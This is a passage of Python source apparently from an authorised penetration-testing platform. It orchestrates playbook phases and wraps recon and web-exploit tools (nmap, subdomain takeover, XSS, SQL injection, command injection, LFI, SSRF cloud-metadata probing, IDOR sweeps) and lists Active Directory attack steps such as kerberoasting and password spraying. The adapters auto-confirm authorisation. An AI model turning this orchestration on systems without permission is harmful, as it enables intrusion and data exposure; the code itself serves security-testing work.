        self._data: dict[str, dict[str, dict[str, Any]]] = {}

    def record(
        self, phase_idx: int, step_id: str,
        summary: dict[str, Any], output_keys: list[str],
    ) -> dict[str, Any]:
        """Extract declared output_keys from summary; if none declared,
        store the whole summary so condition lookups still work.
        """
        key = f"phase_{phase_idx}"
        bucket = self._data.setdefault(key, {})
        if output_keys:
            published = {k: summary.get(k) for k in output_keys}
        else:
            published = dict(summary)
        bucket[step_id] = published
        return published

    def lookup(self, phase_n: int, step_id: str, key: str) -> Any:
        return (self._data.get(f"phase_{phase_n}", {})
                          .get(step_id, {})
                          .get(key))

    def snapshot(self) -> dict[str, Any]:
        return json.loads(json.dumps(self._data, default=str))

    def expand_value(self, value: Any) -> Any:
        """Walk arbitrary JSON-ish structure and expand `{phase_N.step.key}`
        templates inside strings. Returns a deep-copied/expanded value.
        """
        if isinstance(value, str):
            return self._expand_string(value)
        if isinstance(value, dict):
            return {k: self.expand_value(v) for k, v in value.items()}
        if isinstance(value, list):
            return [self.expand_value(v) for v in value]
        return value

    def _expand_string(self, s: str) -> Any:
        # Whole-string reference returns the raw value (preserves lists/dicts).
        m = self._REF_RE.fullmatch(s.strip())
        if m:
            return self.lookup(int(m.group(1)), m.group(2), m.group(3))
        # Embedded refs interpolated as strings.
        def repl(match: re.Match[str]) -> str:
            v = self.lookup(int(match.group(1)), match.group(2), match.group(3))
            return "" if v is None else str(v)
        return self._REF_RE.sub(repl, s)


# ── Condition evaluator ────────────────────────────────────────────────────

# Simple, safe-by-construction expression evaluator. No eval(), no AST exec.
# Grammar:
#   expr      := and_expr ('or' and_expr)*
#   and_expr  := cmp ('and' cmp)*
#   cmp       := term (op term)?
#   op        := '==' | '!=' | '>=' | '<=' | '>' | '<' | 'contains'
#   term      := literal | ref | list_literal
#   ref       := phase_N.step_id.key
#   literal   := true | false | null | number | "quoted string"

_OPS = ["==", "!=", ">=", "<=", ">", "<", "contains"]
_REF_BARE_RE = re.compile(r"^phase_(\d+)\.([a-zA-Z0-9_]+)\.([a-zA-Z0-9_]+)$")
_NUM_RE = re.compile(r"^-?\d+(\.\d+)?$")


def _parse_term(t: str, ctx: _PhaseContext) -> Any:
    t = t.strip()
    if not t:
        return None
    low = t.lower()
    if low == "true":  return True
    if low == "false": return False
    if low in ("null", "none"): return None
    if _NUM_RE.match(t):
        return float(t) if "." in t else int(t)
    if (t.startswith('"') and t.endswith('"')) or (
        t.startswith("'") and t.endswith("'")):
        return t[1:-1]
    m = _REF_BARE_RE.match(t)
    if m:
        return ctx.lookup(int(m.group(1)), m.group(2), m.group(3))
    # Bracketed list literal: [1, 2, "x"]
    if t.startswith("[") and t.endswith("]"):
        inner = t[1:-1].strip()
        if not inner:
            return []
        return [_parse_term(p, ctx) for p in _split_top_level(inner, ",")]
    # Fallback: treat as bare string (allows simple identifier compares).
    return t


def _split_top_level(s: str, sep: str) -> list[str]:
    """Split `s` on `sep` ignoring quoted/bracketed regions."""
    out: list[str] = []
    depth = 0
    quote: str | None = None
    cur = []
    for ch in s:
        if quote:
            cur.append(ch)
            if ch == quote: quote = None
            continue
        if ch in ('"', "'"):
            quote = ch; cur.append(ch); continue
        if ch in "([{": depth += 1; cur.append(ch); continue
        if ch in ")]}": depth -= 1; cur.append(ch); continue
        if depth == 0 and s[len(out)*len(sep):].startswith(sep) and ch == sep[0]:
            # Simple single-char separator path.
            if sep == ch:
                out.append("".join(cur)); cur = []; continue
        cur.append(ch)
    out.append("".join(cur))
    return out


def _eval_compare(lhs: Any, op: str, rhs: Any) -> bool:
    try:
        if op == "==":  return lhs == rhs
        if op == "!=":  return lhs != rhs
        if op == ">":   return float(lhs) >  float(rhs)
        if op == "<":   return float(lhs) <  float(rhs)
        if op == ">=": return float(lhs) >= float(rhs)
        if op == "<=": return float(lhs) <= float(rhs)
        if op == "contains":
            if isinstance(lhs, str):
                return str(rhs) in lhs
            if isinstance(lhs, (list, tuple, set, dict)):
                return rhs in lhs
            return False
    except (TypeError, ValueError):
        return False
    return False


def _eval_cmp(s: str, ctx: _PhaseContext) -> bool:
    s = s.strip()
    # Find the rightmost top-level operator. We scan longest-first so
    # ">=" doesn't get split as ">" + "=".
    for op in _OPS:
        # ' contains ' has spaces; the others may or may not.
        if op == "contains":
            idx = _find_keyword(s, " contains ")
            if idx < 0: continue
            lhs = s[:idx]; rhs = s[idx + len(" contains "):]
            return _eval_compare(_parse_term(lhs, ctx), op, _parse_term(rhs, ctx))
        idx = _find_op(s, op)
        if idx < 0: continue
        lhs = s[:idx]; rhs = s[idx + len(op):]
        return _eval_compare(_parse_term(lhs, ctx), op, _parse_term(rhs, ctx))
    # No operator: truthy on the lone term.
    return bool(_parse_term(s, ctx))


def _find_op(s: str, op: str) -> int:
    """Top-level scan for an operator (ignoring quotes and brackets)."""
    depth = 0; quote: str | None = None
    i = 0
    while i < len(s):
        ch = s[i]
        if quote:
            if ch == quote: quote = None
            i += 1; continue
        if ch in ('"', "'"):
            quote = ch; i += 1; continue
        if ch in "([{": depth += 1; i += 1; continue
        if ch in ")]}": depth -= 1; i += 1; continue
        if depth == 0 and s[i:i+len(op)] == op:
            return i
        i += 1
    return -1


def _find_keyword(s: str, kw: str) -> int:
    """Like _find_op but for a keyword with spaces."""
    return _find_op(s, kw)


def _eval_condition(expr: str | None, ctx: _PhaseContext) -> bool:
    """Evaluate a condition expression. None or '' => True (no condition)."""
    if not expr:
        return True
    expr = expr.strip()
    if not expr:
        return True
    # Top-level OR splits first.
    or_parts = _split_keyword(expr, " or ")
    for p in or_parts:
        # AND splits within an OR clause.
        and_parts = _split_keyword(p, " and ")
        if all(_eval_cmp(a, ctx) for a in and_parts):
            return True
    return False


def _split_keyword(s: str, kw: str) -> list[str]:
    out: list[str] = []
    rest = s
    while True:
        idx = _find_op(rest, kw)
        if idx < 0:
            out.append(rest)
            return out
        out.append(rest[:idx])
        rest = rest[idx + len(kw):]


# ── Per-phase rate limiter ─────────────────────────────────────────────────

class _RateLimit:
    """Simple token bucket. `rate` is requests/sec (positive). 0 or None
    means unlimited.
    """
    def __init__(self, rate: float) -> None:
        self.rate = float(rate or 0)
        self._last = time.monotonic()
        self._interval = (1.0 / self.rate) if self.rate > 0 else 0.0

    async def wait(self) -> None:
        if self._interval <= 0:
            return
        now = time.monotonic()
        elapsed = now - self._last
        if elapsed < self._interval:
            await asyncio.sleep(self._interval - elapsed)
        self._last = time.monotonic()


# ── Internal / placeholder tool adapters ──────────────────────────────────
#
# Phase-based presets reference tools (js_analysis, ioc_correlate,
# generate_report, evil_twin_check, cve_lookup, etc.) whose backends
# don't exist yet. Rather than block preset authoring on those routers,
# we register them as `_INTERNAL_TOOLS` placeholders that emit a single
# `step_progress` event noting the planned work and return an empty
# summary. Schema validation passes; runs surface the gap explicitly.

_PLACEHOLDER_TOOLS = {
    # report + correlation
    "generate_report", "ioc_correlate",
    # web exploit family not yet adapter-wrapped
    "xss", "sqli", "cmdi", "lfi", "ssrf", "idor", "xxe", "ssti",
    "http_smuggling", "oauth_check", "cors",
    # active scan / network
    "nmap", "nmap_vuln", "nmap_full", "nmap_smb",
    "lan_scan", "ping_sweep", "local_disco",
    "smb_enum", "smb_null", "ldap_enum", "ldap_full", "ldap_anon",
    "fingerprint",
    # AD attack
    "kerberoast", "asrep_roast", "bloodhound", "password_spray",
    "ad_spray", "default_creds", "crack_spns",
    "acl_abuse", "delegation_abuse", "gpo_analysis",
    # web extras
    "graphql", "jwt_check", "security_headers", "cookie_analysis",
    "waf_detection", "open_redirect",
    # OSINT
    "asn", "wayback", "breach", "breach_check", "breach_domain",
    "email_harvest", "dorks", "dork_generator",
    "shodan", "shodan_host", "shodan_self",
    "urlscan", "github_dorks", "github_leak",
    "people_enum", "profile_finder", "typosquat",
    # cloud
    "s3_scan", "ssrf_imds", "imds_v2_check",
    "aws_iam", "aws_s3", "aws_ec2", "aws_lambda", "aws_rds", "cloudtrail",
    "sg_analysis", "iam_analysis", "s3_analysis",
    # container / k8s
    "processes", "env_check", "docker_socket", "privileged_check",
    "host_path_abuse", "k8s_api_enum", "secret_dump",
    # wifi / physical
    "wifi_integrity", "wifi_scan", "bluetooth_recon", "bt_recon",
    "evil_twin_check", "wpa_capture",
    "gateway_analysis", "dns_spoof_check",
    # network + recon
    "find_dcs", "dns_internal", "permutation",
    "subdomain_enum", "takeover", "reverse_ip",
    "email_sec", "mx_trace", "webmail_discovery",
    # hash / creds
    "hash_cracker",
    # exploit-db / cve
    "searchsploit", "cve_lookup",
    # misc
    "users_audit", "posture", "ids_check", "ids_snapshot", "tcpdump_sample",
    "port_scanner_external", "http_probe_auth", "http_probe_full",
    "js_analysis",
}


def _make_placeholder(tool: str) -> Callable[..., Awaitable[dict[str, Any]]]:
    async def adapter(target: str, options: dict[str, Any],
                      context: dict[str, Any], emit: EmitFn,
                      stop_event: asyncio.Event) -> dict[str, Any]:
        await emit({
            "type": "step_progress", "step": tool,
            "msg": f"placeholder: {tool!r} adapter not yet implemented; "
                   f"step will produce no real data",
        })
        return {}
    return adapter


for _t in _PLACEHOLDER_TOOLS:
    _TOOL_ADAPTERS.setdefault(_t, _make_placeholder(_t))


# ── Generic HTTP adapters ──────────────────────────────────────────────────
#
# Lets phase-based presets reference any registered FastAPI route without
# needing a typed adapter. Options:
#   path:    backend path with {target} placeholder, e.g. "/whois/{target}"
#   method:  GET (default) or POST
#   query:   dict of query params
#   body:    dict for POST body
#   keys:    keys to pull out of the response into the summary
#
# Example step:
#   {"tool":"http_get",
#    "options":{"path":"/ct/search/{target}",
#               "keys":["subdomains","total_records"]}}

async def _adapter_http_get(target: str, options: dict[str, Any],
                            context: dict[str, Any], emit: EmitFn,
                            stop_event: asyncio.Event) -> dict[str, Any]:
    return await _http_call("GET", target, options, emit)


async def _adapter_http_post(target: str, options: dict[str, Any],
                             context: dict[str, Any], emit: EmitFn,
                             stop_event: asyncio.Event) -> dict[str, Any]:
    return await _http_call("POST", target, options, emit)


async def _http_call(method: str, target: str, options: dict[str, Any],
                     emit: EmitFn) -> dict[str, Any]:
    import httpx
    path = str(options.get("path") or "").replace("{target}", target)
    if not path:
        raise PresetError(f"{method.lower()}: missing `path` option")
    if not path.startswith("/"):
        path = "/" + path
    base = os.environ.get("NT_BACKEND_BASE") or "http://127.0.0.1:8765"
    url = f"{base}{path}"
    query = options.get("query") or {}
    body = options.get("body") or {}
    keys = options.get("keys") or []
    headers = {"X-MHP-Mode": "lab"}  # engine runs internally; safer default
    try:
        async with httpx.AsyncClient(timeout=30.0) as c:
            if method == "GET":
                r = await c.get(url, params=query, headers=headers)
            else:
                r = await c.post(url, params=query, json=body, headers=headers)
    except Exception as exc:
        raise PresetError(f"{method} {path}: {type(exc).__name__}: {exc}") from exc
    try:
        data = r.json() if r.content else {}
    except Exception:
        data = {"raw": r.text[:4000]}
    summary = {k: data.get(k) for k in keys} if keys else dict(data)
    summary["_status"] = r.status_code
    return summary


_TOOL_ADAPTERS.setdefault("http_get",  _adapter_http_get)
_TOOL_ADAPTERS.setdefault("http_post", _adapter_http_post)


# ── Batch 1 real adapters (override placeholders) ──────────────────────────
#
# Each adapter calls the router's existing handler in-process and pulls a
# small summary dict of the most useful fields. Real fields means real
# `output_keys` resolve against ctx, so downstream phases can feed-forward
# from these tools instead of hitting placeholders.


async def _adapter_breach(target: str, options: dict[str, Any],
                          context: dict[str, Any], emit: EmitFn,
                          stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import breach as r
    host = _target_to_host(target)
    if not host or _looks_like_ip(host) or "." not in host:
        await emit({
            "type": "step_progress", "step": "breach",
            "msg": f"skipped: {host or target!r} is not a domain",
        })
        return {"breach_found": False, "breach_count": 0,
                "breached_accounts": 0, "breaches": [],
                "data_types": [], "exposed_data_types": [], "skipped": True}
    # The HIBP "domain" endpoint is paid-API gated. Soft-skip when no key.
    try:
        result = await r.domain_check(host)
    except Exception as e:
        await emit({"type": "step_progress", "step": "breach",
                    "msg": f"breach: {type(e).__name__} (HIBP key configured?)"})
        return {"breach_found": False, "breach_count": 0,
                "breached_accounts": 0, "breaches": [],
                "data_types": [], "exposed_data_types": [], "skipped": True}
    breaches = result.get("breaches", []) or []
    data_types: set[str] = set()
    for b in breaches:
        for d in b.get("data_classes") or []:
            data_types.add(d)
    if breaches:
        await emit({
            "type": "finding", "step": "breach",
            "severity": "high",
            "title": f"{len(breaches)} breach record(s) for {target}",
            "detail": ", ".join(b.get("name", "?") for b in breaches[:6]),
        })
    return {
        "breach_found": bool(breaches),
        "breach_count": len(breaches),
        "breached_accounts": len(breaches),  # alias for promotion rules
        "breaches": [b.get("name") for b in breaches],
        "data_types": sorted(data_types),
        "exposed_data_types": sorted(data_types),
    }


async def _adapter_wayback(target: str, options: dict[str, Any],
                           context: dict[str, Any], emit: EmitFn,
                           stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import wayback as r
    host = _target_to_host(target)
    if not host or _looks_like_ip(host) or "." not in host:
        await emit({
            "type": "step_progress", "step": "wayback",
            "msg": f"skipped: {host or target!r} is not a domain",
        })
        return {"total_urls": 0, "interesting_urls": [], "js_files": [],
                "api_endpoints": [], "endpoints": [],
                "forgotten_endpoints": [], "skipped": True}
    try:
        result = await r.urls(host, _LocalReq(), limit=500)
    except TypeError:
        # Tolerate older signatures during the migration window.
        try:
            result = await r.urls(host, _LocalReq())
        except Exception as e:
            raise PresetError(f"wayback: {e}") from e
    except Exception as e:
        raise PresetError(f"wayback: {e}") from e
    urls = result.get("urls", []) or result.get("all", []) or []
    js = [u for u in urls if isinstance(u, str) and u.lower().endswith(".js")]
    api = [u for u in urls if isinstance(u, str)
           and ("/api/" in u.lower() or u.lower().endswith(".json")
                or "graphql" in u.lower())]
    interesting = [u for u in urls if isinstance(u, str)
                   and any(k in u.lower() for k in
                           ("admin", "config", ".env", "backup", "debug",
                            "private", "internal"))]
    return {
        "total_urls": len(urls),
        "interesting_urls": interesting[:200],
        "js_files": js[:200],
        "api_endpoints": api[:200],
        "endpoints": urls[:200],
        "forgotten_endpoints": interesting[:50],
    }


async def _adapter_urlscan(target: str, options: dict[str, Any],
                           context: dict[str, Any], emit: EmitFn,
                           stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import urlscan as r
    host = _target_to_host(target)
    if not host or _looks_like_ip(host) or "." not in host:
        await emit({
            "type": "step_progress", "step": "urlscan",
            "msg": f"skipped: {host or target!r} is not a domain",
        })
        return {"screenshots": [], "technologies": [], "history": [],
                "malicious_indicators": [], "malicious_flags": 0,
                "third_party_scripts": [], "cdn_providers": [], "skipped": True}
    try:
        result = await r.search(host, _LocalReq())
    except Exception as e:
        raise PresetError(f"urlscan: {e}") from e
    rows = result.get("results", []) or []
    techs = sorted({t for row in rows for t in (row.get("technologies") or [])})
    malicious = [row for row in rows if row.get("malicious")]
    return {
        "screenshots": [row.get("screenshot_url") for row in rows if row.get("screenshot_url")][:50],
        "technologies": techs,
        "history": rows[:50],
        "malicious_indicators": [row.get("url") for row in malicious][:25],
        "malicious_flags": len(malicious),
        "third_party_scripts": techs[:25],
        "cdn_providers": [t for t in techs if "cdn" in t.lower()][:10],
    }


async def _adapter_takeover(target: str, options: dict[str, Any],
                            context: dict[str, Any], emit: EmitFn,
                            stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import takeover as r
    # Build a minimal Request-like surface for the handler's get_mode/eid
    # reads — same trick the _LocalWS shim uses.
    class _Req:
        class _C:
            host = "127.0.0.1"; port = 0
        client = _C()
        headers: dict[str, str] = {}
        query_params: dict[str, str] = {}
    try:
        result = await r.takeover_check(
            fqdn=target, request=_Req(), confirm=True, confirm_auth=True,
        )
    except Exception as e:
        raise PresetError(f"takeover: {e}") from e
    verdict = result.get("verdict") or ""
    vulnerable = verdict in ("vulnerable", "dangling")
    if vulnerable:
        await emit({
            "type": "finding", "step": "takeover",
            "severity": "critical" if verdict == "vulnerable" else "high",
            "title": f"Subdomain takeover {verdict}: {target}",
            "detail": result.get("evidence", "")[:300],
        })
    return {
        "subdomain_takeover": vulnerable,
        "takeover_found": vulnerable,
        "vulnerable_subdomains": [target] if vulnerable else [],
        "takeover_candidates": [target] if vulnerable else [],
        "service": result.get("service"),
        "cname_chain": result.get("cname_chain", []),
        "verdict": verdict,
    }


async def _adapter_lan_scan(target: str, options: dict[str, Any],
                            context: dict[str, Any], emit: EmitFn,
                            stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import lan_scan as r
    init = {"network": options.get("network") or target or ""}
    hosts: list[dict[str, Any]] = []

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        t = ev.get("type")
        if t == "host":
            hosts.append({
                "ip": ev.get("ip"),
                "hostname": ev.get("hostname"),
                "mac": ev.get("mac"),
            })
        elif t == "progress":
            await emit({"type": "step_progress", "step": "lan_scan",
                        "msg": f"{ev.get('done',0)}/{ev.get('total',0)} probed"})
        elif t == "error":
            raise PresetError(f"lan_scan: {ev.get('detail','')}")

    await _drive_ws(r.lan_scan_ws, init, emit, stop_event, on_event=on_event)
    return {
        "hosts": hosts,
        "ips": [h["ip"] for h in hosts if h.get("ip")],
        "macs": [h["mac"] for h in hosts if h.get("mac")],
        "vendors": [],
        "alive_hosts": [h["ip"] for h in hosts if h.get("ip")],
    }


async def _adapter_subdomain_enum(target: str, options: dict[str, Any],
                                  context: dict[str, Any], emit: EmitFn,
                                  stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import subdomain_enum as r
    init = {
        "domain": target,
        "sources": options.get("sources") or ["crtsh", "hackertarget", "otx"],
        "permutations": bool(options.get("permutations", False)),
        "confirm_auth": True,
    }
    subdomains: set[str] = set()

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        t = ev.get("type")
        if t == "found":
            n = ev.get("name")
            if n: subdomains.add(n)
        elif t == "source_done":
            await emit({"type": "step_progress", "step": "subdomain_enum",
                        "msg": f"{ev.get('source')}: {ev.get('count',0)}"})
        elif t == "error":
            raise PresetError(f"subdomain_enum: {ev.get('detail','')}")

    await _drive_ws(r.subdom_ws, init, emit, stop_event, on_event=on_event)
    subs = sorted(subdomains)
    return {
        "subdomains": subs,
        "total_found": len(subs),
        "found": len(subs),
    }


async def _adapter_nmap(target: str, options: dict[str, Any],
                        context: dict[str, Any], emit: EmitFn,
                        stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import nmap as r
    targets = options.get("targets") or [target]
    if isinstance(targets, str):
        targets = [targets]
    init = {
        "opts": {"targets": [str(t) for t in targets if t]},
        "preset": options.get("preset"),
        "scripts": options.get("scripts") or [],
        "script_args": options.get("script_args") or "",
        "ports": options.get("ports") or "",
        "confirm": True,
    }
    report_summary: dict[str, Any] = {}
    vulnerabilities: list[str] = []
    cves: set[str] = set()

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        t = ev.get("type")
        if t == "done":
            rep = ev.get("report") or {}
            report_summary.update({
                "hosts_up": rep.get("hosts_up", 0),
                "hosts_total": rep.get("hosts_total", 0),
                "elapsed": rep.get("elapsed", 0),
            })
            for h in rep.get("hosts", []) or []:
                for s in h.get("host_scripts", []) or []:
                    out = (s.get("output") or "")[:400]
                    if "VULNERABLE" in out or "CVE-" in out:
                        vulnerabilities.append(f"{h.get('ip')}: {s.get('id')}")
                    for tok in out.split():
                        if tok.startswith("CVE-"):
                            cves.add(tok.rstrip(",.;:"))
                for p in h.get("ports", []) or []:
                    for s in p.get("scripts", []) or []:
                        out = (s.get("output") or "")[:400]
                        if "VULNERABLE" in out or "CVE-" in out:
                            vulnerabilities.append(
                                f"{h.get('ip')}:{p.get('port')}: {s.get('id')}"
                            )
                        for tok in out.split():
                            if tok.startswith("CVE-"):
                                cves.add(tok.rstrip(",.;:"))
        elif t == "error":
            raise PresetError(f"nmap: {ev.get('detail','')}")

    await _drive_ws(r.nmap_ws, init, emit, stop_event, on_event=on_event)
    return {
        **report_summary,
        "vulnerabilities": vulnerabilities,
        "cves": sorted(cves),
    }


# ── Batch 2 real adapters — web exploit family ─────────────────────────────
#
# Shared pattern: pull `url`/`method`/`body`/`headers`/`cookies` from
# options (fall back to `target` as the URL), call the WS handler via
# _drive_ws, count `finding` events, and emit the summary fields the v2
# bundles declare in `output_keys` (reflected_xss, sqli_detected,
# injectable_params, etc.) so the finding-promotion rules trigger.

def _web_init_from(target: str, options: dict[str, Any],
                   default_marker: str = "FUZZ") -> dict[str, Any]:
    url = str(options.get("url") or target or "").strip()
    # If a feed-forward `targets` list was passed (from http_probe.paths_found,
    # for example), use the first entry as the URL.
    if not url:
        targets = options.get("targets")
        if isinstance(targets, list) and targets:
            url = str(targets[0])
    # Best-effort marker injection: if the URL doesn't include the marker,
    # append `?q=FUZZ` so the run doesn't immediately fail validation.
    if url and default_marker not in url and "?" not in url:
        url = url + "?q=" + default_marker
    elif url and default_marker not in url:
        url = url + "&q=" + default_marker
    # Web-exploit routers reject private/loopback targets unless allow_private
    # is set. Playbooks fired at labs always hit loopback URLs; the playbook
    # runner has already authorized the run via the top-level scope check, so
    # auto-enable allow_private when the target resolves to a private/loopback
    # IP. Public targets still default to false (caller can opt in).
    host = _target_to_host(url)
    auto_internal = False
    if host:
        try:
            import ipaddress
            ip = ipaddress.ip_address(host)
            auto_internal = ip.is_loopback or ip.is_private
        except ValueError:
            # Hostname — let the router's resolver decide.
            pass
    return {
        "url": url,
        "method":  str(options.get("method") or "GET").upper(),
        "body":    str(options.get("body") or ""),
        "headers": dict(options.get("headers") or {}),
        "cookies": dict(options.get("cookies") or {}),
        "allow_private": bool(options.get("allow_private", auto_internal)),
        "rate_per_sec":  int(options.get("rate_per_sec") or 5),
        "confirm_auth":  True,  # playbook runner already gates this
    }


async def _adapter_xss(target: str, options: dict[str, Any],
                       context: dict[str, Any], emit: EmitFn,
                       stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import xss as r
    init = _web_init_from(target, options)
    findings_count = 0
    contexts: set[str] = set()
    confirmed = 0

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        nonlocal findings_count, confirmed
        t = ev.get("type")
        if t == "finding":
            findings_count += 1
            if ev.get("confirmed"): confirmed += 1
            c = ev.get("context")
            if c: contexts.add(str(c))
        elif t == "error":
            raise PresetError(f"xss: {ev.get('detail','')}")

    await _drive_ws(r.xss_ws, init, emit, stop_event, on_event=on_event)
    detected = findings_count > 0
    return {
        "xss_detected": detected,
        "reflected_xss": detected,
        "stored_xss": False,  # the router only does reflection probing
        "dom_xss": False,
        "contexts": sorted(contexts),
        "confirmed": confirmed,
        "finding_count": findings_count,
    }


async def _adapter_sqli(target: str, options: dict[str, Any],
                        context: dict[str, Any], emit: EmitFn,
                        stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import sqli as r
    init = _web_init_from(target, options)
    init["exploit"] = bool(options.get("exploit", False))
    findings_count = 0
    methods_hit: set[str] = set()
    dbms_detected: str | None = None
    injectable: set[str] = set()

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        nonlocal findings_count, dbms_detected
        t = ev.get("type")
        if t == "finding":
            findings_count += 1
            m = ev.get("method")
            if m: methods_hit.add(str(m))
            p = ev.get("parameter") or ev.get("param")
            if p: injectable.add(str(p))
        elif t == "done":
            dbms_detected = ev.get("dbms")
        elif t == "error":
            raise PresetError(f"sqli: {ev.get('detail','')}")

    await _drive_ws(r.sqli_ws, init, emit, stop_event, on_event=on_event)
    detected = findings_count > 0
    return {
        "sqli_detected": detected,
        "sqli_found": detected,
        "injectable_params": sorted(injectable),
        "dbms": dbms_detected,
        "version": None,
        "blind_sqli": "boolean" in methods_hit or "time" in methods_hit,
        "union_sqli": "union" in methods_hit,
        "methods": sorted(methods_hit),
    }


async def _adapter_cmdi(target: str, options: dict[str, Any],
                        context: dict[str, Any], emit: EmitFn,
                        stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import cmdi as r
    init = _web_init_from(target, options)
    init["exploit"] = bool(options.get("exploit", False))
    findings_count = 0
    modes_hit: set[str] = set()
    last_output = ""

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        nonlocal findings_count, last_output
        t = ev.get("type")
        if t == "finding":
            findings_count += 1
            m = ev.get("mode")
            if m: modes_hit.add(str(m))
            ev_out = ev.get("evidence") or ev.get("output")
            if ev_out: last_output = str(ev_out)[:400]
        elif t == "error":
            raise PresetError(f"cmdi: {ev.get('detail','')}")

    await _drive_ws(r.cmdi_ws, init, emit, stop_event, on_event=on_event)
    detected = findings_count > 0
    return {
        "cmdi_found": detected,
        "cmdi_detected": detected,
        "os": "unknown",
        "output": last_output,
        "modes": sorted(modes_hit),
    }


async def _adapter_lfi(target: str, options: dict[str, Any],
                       context: dict[str, Any], emit: EmitFn,
                       stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import lfi as r
    init = _web_init_from(target, options)
    init["exploit"] = bool(options.get("exploit", False))
    findings_count = 0
    files_read: list[str] = []

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        nonlocal findings_count
        t = ev.get("type")
        if t == "finding":
            findings_count += 1
            hit = ev.get("hit") or ev.get("evidence")
            if hit: files_read.append(str(hit)[:120])
        elif t == "error":
            raise PresetError(f"lfi: {ev.get('detail','')}")

    await _drive_ws(r.lfi_ws, init, emit, stop_event, on_event=on_event)
    detected = findings_count > 0
    return {
        "lfi_found": detected,
        "files_read": files_read[:50],
        "files_accessible": files_read[:50],
    }


async def _adapter_ssrf(target: str, options: dict[str, Any],
                        context: dict[str, Any], emit: EmitFn,
                        stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import ssrf as r
    init = _web_init_from(target, options)
    init["exploit"] = bool(options.get("exploit", False))
    findings_count = 0
    clouds: set[str] = set()
    internal_hit = False

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        nonlocal findings_count, internal_hit
        t = ev.get("type")
        if t == "finding":
            findings_count += 1
            cl = ev.get("hit")
            if cl: clouds.add(str(cl))
            if "loopback" in str(ev.get("evidence", "")).lower():
                internal_hit = True
        elif t == "done":
            for cl in ev.get("clouds", []) or []:
                clouds.add(str(cl))
        elif t == "error":
            raise PresetError(f"ssrf: {ev.get('detail','')}")

    await _drive_ws(r.ssrf_ws, init, emit, stop_event, on_event=on_event)
    detected = findings_count > 0
    imds = any(c in {"aws", "azure", "gcp", "imds"} for c in clouds)
    return {
        "ssrf_found": detected,
        "internal_access": internal_hit,
        "imds_access": imds,
        "imds_accessible": imds,
        "imds_exposed": imds,
        "credentials_exposed": imds and detected,
        "internal_hosts": sorted(clouds),
        "cloud_metadata": sorted(clouds),
    }


async def _adapter_idor(target: str, options: dict[str, Any],
                        context: dict[str, Any], emit: EmitFn,
                        stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import idor as r
    init = _web_init_from(target, options)
    # IDOR router requires `ids` (explicit list) or a `{start,end,step}` range.
    # Most presets don't author either — provide a conservative default sweep
    # so the step produces real signal instead of hard-erroring.
    if "ids" in options:
        init["ids"] = options["ids"]
    elif any(k in options for k in ("start", "end", "step")):
        init["ids"] = {
            "start": int(options.get("start", 1)),
            "end":   int(options.get("end", 50)),
            "step":  int(options.get("step", 1)),
        }
    else:
        init["ids"] = {"start": 1, "end": 25, "step": 1}
    # Pick a parameter to swap if one isn't specified — `id` is the most
    # common IDOR-vulnerable param. The router defaults to `FUZZ` marker.
    init.setdefault("param", str(options.get("param") or "id"))
    exposed_ids: list[str] = []
    findings_count = 0

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        nonlocal findings_count
        t = ev.get("type")
        if t == "finding" or t == "row":
            findings_count += 1
            obj = ev.get("id") or ev.get("identifier")
            if obj: exposed_ids.append(str(obj))
        elif t == "error":
            raise PresetError(f"idor: {ev.get('detail','')}")

    await _drive_ws(r.idor_ws, init, emit, stop_event, on_event=on_event)
    detected = findings_count > 0
    return {
        "idor_found": detected,
        "exposed_ids": exposed_ids[:100],
        "exposed_objects": exposed_ids[:100],
    }


# Override the placeholder entries with the real adapters.
_TOOL_ADAPTERS["breach"]         = _adapter_breach
_TOOL_ADAPTERS["breach_check"]   = _adapter_breach
_TOOL_ADAPTERS["breach_domain"]  = _adapter_breach
_TOOL_ADAPTERS["wayback"]        = _adapter_wayback
_TOOL_ADAPTERS["urlscan"]        = _adapter_urlscan
_TOOL_ADAPTERS["takeover"]       = _adapter_takeover
_TOOL_ADAPTERS["lan_scan"]       = _adapter_lan_scan
_TOOL_ADAPTERS["subdomain_enum"] = _adapter_subdomain_enum
_TOOL_ADAPTERS["nmap"]           = _adapter_nmap
_TOOL_ADAPTERS["nmap_vuln"]      = _adapter_nmap
_TOOL_ADAPTERS["nmap_full"]      = _adapter_nmap
_TOOL_ADAPTERS["nmap_smb"]       = _adapter_nmap

# Web exploit family
_TOOL_ADAPTERS["xss"]            = _adapter_xss
_TOOL_ADAPTERS["xss_passive"]    = _adapter_xss
_TOOL_ADAPTERS["sqli"]           = _adapter_sqli
_TOOL_ADAPTERS["cmdi"]           = _adapter_cmdi
_TOOL_ADAPTERS["lfi"]            = _adapter_lfi
_TOOL_ADAPTERS["ssrf"]           = _adapter_ssrf
_TOOL_ADAPTERS["ssrf_imds"]      = _adapter_ssrf
_TOOL_ADAPTERS["idor"]           = _adapter_idor
_TOOL_ADAPTERS["idor_own"]       = _adapter_idor


# ── Batch 3 real adapters — AD attack family ───────────────────────────────
#
# These need real AD credentials at runtime, which the playbook authors
# either hard-code in the step's `options.creds` or feed forward from an
# earlier step (password_spray.valid_creds → kerberoast.creds). When
# creds are missing the adapter emits a `step_progress` note and returns
# an empty summary — the playbook keeps moving instead of erroring.


def _need_creds(tool: str, options: dict[str, Any]) -> dict[str, Any] | None:
    """Pull a creds dict from options or return None if incomplete."""
